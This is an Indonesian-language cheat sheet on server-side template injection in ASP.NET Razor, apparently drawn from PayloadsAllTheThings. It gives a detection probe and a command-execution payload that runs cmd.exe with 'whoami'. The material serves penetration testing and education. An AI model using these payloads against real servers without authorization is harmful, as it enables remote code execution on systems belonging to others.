# Server Side Template Injection - ASP.NET

> **Server-Side Template Injection (SSTI)** adalah kerentanan di mana penyerang dapat menyisipkan input berbahaya ke dalam template di sisi server, sehingga template engine mengeksekusi kode arbitrer di server. Pada ASP.NET, SSTI bisa terjadi jika input pengguna langsung dimasukkan ke template (seperti Razor, ASPX, atau engine lain) tanpa sanitasi yang benar.

## Ringkasan

- [ASP.NET Razor](#aspnet-razor)
  - [Injeksi Dasar](#injeksi-dasar)
  - [Eksekusi Perintah](#eksekusi-perintah)
- [Referensi](#referensi)

## ASP.NET Razor

[Razor Docs Resmi](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)

> Razor adalah sintaks markup yang memungkinkan Anda menyisipkan kode server (C# atau VB) ke dalam halaman web.

### Injeksi Dasar

Coba payload berikut untuk menguji SSTI pada Razor:

```csharp
@(1+2)
```

Jika output menjadi `3`, kemungkinan besar aplikasi rentan SSTI.

### Eksekusi Perintah

Payload berikut dapat digunakan untuk mencoba eksekusi kode (jika memungkinkan):

```csharp
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c whoami";
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    var output = proc.StandardOutput.ReadToEnd();
    proc.WaitForExit();
    @output
}
```

> **Catatan:** Payload eksekusi perintah biasanya diblokir pada konfigurasi default.

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
